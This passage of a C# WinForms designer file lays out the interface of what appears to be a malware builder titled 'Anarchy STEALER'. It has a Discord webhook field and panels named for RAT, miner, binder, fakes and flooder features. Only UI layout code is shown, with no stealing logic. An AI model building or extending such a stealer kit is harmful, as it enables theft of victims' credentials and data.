            this.tabPage2.Controls.Add(this.webhookCheck);
            this.tabPage2.Controls.Add(this.guna2HtmlLabel1);
            this.tabPage2.Controls.Add(this.buildButton);
            this.tabPage2.Controls.Add(this.webhookBox);
            this.tabPage2.Controls.Add(this.buildingLabel);
            this.tabPage2.Location = new System.Drawing.Point(4, 26);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Size = new System.Drawing.Size(693, 210);
            this.tabPage2.TabIndex = 2;
            this.tabPage2.Text = "Discord Webhook";
            // 
            // button6
            // 
            this.button6.BackColor = System.Drawing.Color.Transparent;
            this.button6.BorderRadius = 8;
            this.button6.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(27)))), ((int)(((byte)(27)))));
            this.button6.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button6.ForeColor = System.Drawing.Color.White;
            this.button6.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.button6.Location = new System.Drawing.Point(608, 186);
            this.button6.Name = "button6";
            this.button6.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.button6.ShadowDecoration.BorderRadius = 10;
            this.button6.ShadowDecoration.Color = System.Drawing.Color.MediumSlateBlue;
            this.button6.ShadowDecoration.Depth = 20;
            this.button6.ShadowDecoration.Enabled = true;
            this.button6.Size = new System.Drawing.Size(83, 24);
            this.button6.TabIndex = 201;
            this.button6.Text = "Stopped";
            this.button6.Visible = false;
            this.button6.Click += new System.EventHandler(this.button6_Click);
            // 
            // button5
            // 
            this.button5.BackColor = System.Drawing.Color.Transparent;
            this.button5.BorderRadius = 8;
            this.button5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(27)))), ((int)(((byte)(27)))));
            this.button5.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button5.ForeColor = System.Drawing.Color.White;
            this.button5.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.button5.Location = new System.Drawing.Point(519, 184);
            this.button5.Name = "button5";
            this.button5.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.button5.ShadowDecoration.BorderRadius = 10;
            this.button5.ShadowDecoration.Color = System.Drawing.Color.MediumSlateBlue;
            this.button5.ShadowDecoration.Depth = 20;
            this.button5.ShadowDecoration.Enabled = true;
            this.button5.Size = new System.Drawing.Size(83, 24);
            this.button5.TabIndex = 200;
            this.button5.Text = "Start";
            this.button5.Visible = false;
            this.button5.Click += new System.EventHandler(this.button5_Click);
            // 
            // webhookCheck
            // 
            this.webhookCheck.BackColor = System.Drawing.Color.Transparent;
            this.webhookCheck.BorderRadius = 8;
            this.webhookCheck.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(27)))), ((int)(((byte)(27)))));
            this.webhookCheck.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.webhookCheck.ForeColor = System.Drawing.Color.White;
            this.webhookCheck.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.webhookCheck.Location = new System.Drawing.Point(602, 12);
            this.webhookCheck.Name = "webhookCheck";
            this.webhookCheck.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.webhookCheck.ShadowDecoration.BorderRadius = 10;
            this.webhookCheck.ShadowDecoration.Color = System.Drawing.Color.MediumSlateBlue;
            this.webhookCheck.ShadowDecoration.Depth = 20;
            this.webhookCheck.ShadowDecoration.Enabled = true;
            this.webhookCheck.Size = new System.Drawing.Size(83, 24);
            this.webhookCheck.TabIndex = 199;
            this.webhookCheck.Text = "Check";
            this.webhookCheck.Click += new System.EventHandler(this.webhookCheck_Click);
            // 
            // guna2HtmlLabel1
            // 
            this.guna2HtmlLabel1.BackColor = System.Drawing.Color.Transparent;
            this.guna2HtmlLabel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.guna2HtmlLabel1.ForeColor = System.Drawing.Color.White;
            this.guna2HtmlLabel1.Location = new System.Drawing.Point(18, 12);
            this.guna2HtmlLabel1.Name = "guna2HtmlLabel1";
            this.guna2HtmlLabel1.Size = new System.Drawing.Size(79, 22);
            this.guna2HtmlLabel1.TabIndex = 198;
            this.guna2HtmlLabel1.Text = "Webhook :";
            // 
            // buildButton
            // 
            this.buildButton.BackColor = System.Drawing.Color.Transparent;
            this.buildButton.BorderRadius = 8;
            this.buildButton.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(27)))), ((int)(((byte)(27)))));
            this.buildButton.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buildButton.ForeColor = System.Drawing.Color.White;
            this.buildButton.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.buildButton.Location = new System.Drawing.Point(18, 71);
            this.buildButton.Name = "buildButton";
            this.buildButton.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.buildButton.ShadowDecoration.BorderRadius = 10;
            this.buildButton.ShadowDecoration.Color = System.Drawing.Color.MediumSlateBlue;
            this.buildButton.ShadowDecoration.Depth = 20;
            this.buildButton.ShadowDecoration.Enabled = true;
            this.buildButton.Size = new System.Drawing.Size(667, 47);
            this.buildButton.TabIndex = 197;
            this.buildButton.Text = "Save";
            this.buildButton.Click += new System.EventHandler(this.buildButton_Click);
            // 
            // webhookBox
            // 
            this.webhookBox.BackColor = System.Drawing.Color.Transparent;
            this.webhookBox.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(72)))), ((int)(((byte)(75)))));
            this.webhookBox.BorderRadius = 5;
            this.webhookBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.webhookBox.DefaultText = "";
            this.webhookBox.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.webhookBox.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.webhookBox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.webhookBox.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.webhookBox.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.webhookBox.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.webhookBox.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.webhookBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.webhookBox.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.webhookBox.Location = new System.Drawing.Point(18, 40);
            this.webhookBox.Name = "webhookBox";
            this.webhookBox.PasswordChar = '\0';
            this.webhookBox.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.webhookBox.PlaceholderText = "https://discord.com/api/webhooks/.../...";
            this.webhookBox.SelectedText = "";
            this.webhookBox.ShadowDecoration.Color = System.Drawing.Color.Silver;
            this.webhookBox.ShadowDecoration.Depth = 10;
            this.webhookBox.Size = new System.Drawing.Size(667, 25);
            this.webhookBox.TabIndex = 122;
            // 
            // buildingLabel
            // 
            this.buildingLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.buildingLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.buildingLabel.Location = new System.Drawing.Point(14, 129);
            this.buildingLabel.Name = "buildingLabel";
            this.buildingLabel.Size = new System.Drawing.Size(671, 40);
            this.buildingLabel.TabIndex = 15;
            this.buildingLabel.Text = "Idle...";
            this.buildingLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.buildingLabel.Visible = false;
            // 
            // guna2Panel2
            // 
            this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Panel2.Controls.Add(this.label67);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
            this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(72)))), ((int)(((byte)(75)))));
            this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
            this.guna2Panel2.ShadowDecoration.Depth = 15;
            this.guna2Panel2.Size = new System.Drawing.Size(701, 36);
            this.guna2Panel2.TabIndex = 78;
            // 
            // label67
            // 
            this.label67.AutoSize = true;
            this.label67.BackColor = System.Drawing.Color.Transparent;
            this.label67.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold);
            this.label67.ForeColor = System.Drawing.Color.White;
            this.label67.Location = new System.Drawing.Point(3, 9);
            this.label67.Name = "label67";
            this.label67.Size = new System.Drawing.Size(186, 24);
            this.label67.TabIndex = 22;
            this.label67.Text = "Anarchy STEALER";
            // 
            // siticoneControlBox4
            // 
            this.siticoneControlBox4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.BorderRadius = 10;
            this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox4.Location = new System.Drawing.Point(601, 5);
            this.siticoneControlBox4.Name = "siticoneControlBox4";
            this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.Size = new System.Drawing.Size(45, 25);
            this.siticoneControlBox4.TabIndex = 21;
            // 
            // siticoneControlBox3
            // 
            this.siticoneControlBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.BorderRadius = 10;
            this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox3.Location = new System.Drawing.Point(652, 5);
            this.siticoneControlBox3.Name = "siticoneControlBox3";
            this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
            this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.Size = new System.Drawing.Size(45, 25);
            this.siticoneControlBox3.TabIndex = 20;
            // 
            // guna2BorderlessForm1
            // 
            this.guna2BorderlessForm1.BorderRadius = 6;
            this.guna2BorderlessForm1.ContainerControl = this;
            this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.Red;
            this.guna2BorderlessForm1.TransparentWhileDrag = true;
            // 
            // guna2DragControl1
            // 
            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2DragControl1.TargetControl = this.guna2Panel2;
            this.guna2DragControl1.UseTransparentDrag = true;
            // 
            // GForm0
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.ClientSize = new System.Drawing.Size(701, 279);
            this.Controls.Add(this.guna2Panel2);
            this.Controls.Add(this.guna2TabControl1);
            this.Controls.Add(this.settingsSite);
            this.Controls.Add(this.fakesSite);
            this.Controls.Add(this.qrSite);
            this.Controls.Add(this.ratSite);
            this.Controls.Add(this.miscSite);
            this.Controls.Add(this.inspectorSite);
            this.Controls.Add(this.sidePanel);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "GForm0";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Load += new System.EventHandler(this.dAIOmain_Load);
            this.ResizeEnd += new System.EventHandler(this.dAIOmain_ResizeEnd);
            this.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Form1_MouseDown);
            this.Move += new System.EventHandler(this.dAIOmain_Move);
            this.sidePanel.ResumeLayout(false);
            this.sidePanel.PerformLayout();
            this.panel2.ResumeLayout(false);
            this.settingsSite.ResumeLayout(false);
            this.settingsSite.PerformLayout();
            this.mainSite.ResumeLayout(false);
            this.mainSite.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.embedBox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.iconBox)).EndInit();
            this.inspectorSite.ResumeLayout(false);
            this.inspectorSite.PerformLayout();
            this.additionalSite.ResumeLayout(false);
            this.additionalSite.PerformLayout();
            this.miscSite.ResumeLayout(false);
            this.miscSite.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.avatarBox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.flooderEmbed)).EndInit();
            this.minerSite.ResumeLayout(false);
            this.minerSite.PerformLayout();
            this.ratSite.ResumeLayout(false);
            this.ratSite.PerformLayout();
            this.qrSite.ResumeLayout(false);
            this.qrSite.PerformLayout();
            this.binderSite.ResumeLayout(false);
            this.binderSite.PerformLayout();
            this.fakesSite.ResumeLayout(false);
            this.fakesSite.PerformLayout();
            this.guna2TabControl1.ResumeLayout(false);
            this.tabPage3.ResumeLayout(false);
            this.tabPage3.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            this.guna2Panel2.ResumeLayout(false);
            this.guna2Panel2.PerformLayout();
            this.ResumeLayout(false);

    }
}